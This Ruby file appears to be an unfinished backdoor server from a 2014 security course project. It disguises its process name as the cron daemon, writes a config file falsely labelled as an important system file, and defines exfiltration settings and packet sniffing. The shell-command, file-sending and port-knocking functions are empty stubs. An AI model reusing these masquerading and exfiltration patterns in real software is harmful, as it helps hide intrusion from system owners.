#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - description goes here
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         notes might go here
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables

$KEY = OpenSSL::Digest::SHA256.new("verysecretkey").digest

## Application Strings
CONFIG_FILE = "not_important"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 6868\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"

## Functions
def exit_reason(reason)
    puts reason
    exit
end

def load_config_file
  if File.exists? CONFIG_FILE
    validate_config
  else
    create_default_config
  end 
end

def create_default_config
  File.open(CONFIG_FILE, 'a') do |f|
      f.write(CONFIG_FILE_DEFAULT)
  end
  exit_reason(CONFIG_CREATE)
end

def validate_config
  file = ""
  File.open(CONFIG_FILE, "r") { |f| file = f.readlines }
  file.each do |l|
    l.strip!
    if l[0] == '#' #line is comment
      next
    elsif l.include? '='
      pair = l.split('=')
      begin
        pair[0].strip!
        pair[1].strip!
      rescue #if strip fails, pair is blank, bad config
        exit_reason(CONFIG_INVALID)
      end

      case pair[0]
      when "exfil_prot"
        if valid_protocol(pair[1])
          @cfg_protocol = pair[1]
        end
      when "exfil_port"
        if valid_port(pair[1].to_i)
          @cfg_port = pair[1].to_i
        end
      when "interface"
        #interface validation?
        @cfg_iface = pair[1]
      end
    end
  end
  if @cfg_port == nil
    exit_reason(CONFIG_INVALID)
  end
end

def valid_protocol(protocol)
  protocol.downcase!
  case protocol
  when "tcp"
    return true
  when "udp"
    return true
  else
    return false
  end
end

# Checks port range validity (1-65535)
#
# @param [Integer] num
# - port to check
# @return [bool]
# - true if valid, false if not
def valid_port(num)
    if num >= 1 && num <= 65535
      return true
    else
      return false
    end
end

def start_listen_server
  puts "server listening"
  filter = "#{@cfg_protocol}"
  begin
    cap = PacketFu::Capture.new(:iface => @cfg_iface,
      :start => true,
      :promic => true,
      :filter => filter)
    cap.stream.each do |p|
      pkt =  PacketFu::Packet.parse(p)
      puts pkt
      #look at packets here
      #check for auth
      #commands

    end
  rescue Exception => e
    puts "error in packet capture"
    #if bad error raise exception to kill program
  end
end

def encrypt(msg)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.encrypt

  cipher.key = $KEY

  begin
      payload = cipher.update(msg)
      payload << cipher.final
  rescue Exception => e
      puts "encryption error"
  end
  return payload
end

def decrypt(payload)
  cipher = OpenSSL::Cipher::AES256.new(:CBC)
  cipher.decrypt

  cipher.key = $KEY

  begin
      msg = cipher.update(payload)
      msg << cipher.final
  rescue Exception => e
      puts "decryption error"
  end
  return msg
end

def parse_payload(payload)

end

def execute_shell_command(command)

end

def start_watch(type, name)
  #type is file or folder
  
end

def send_file(file, destination)
  
end

def generate_knock_seq
  
end

## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
load_config_file
begin
  #listen_thread = Thread.new { start_listen_server }
  #listen_thread.join

rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
  #Thread.kill(listen_thread)
  exit 0
end
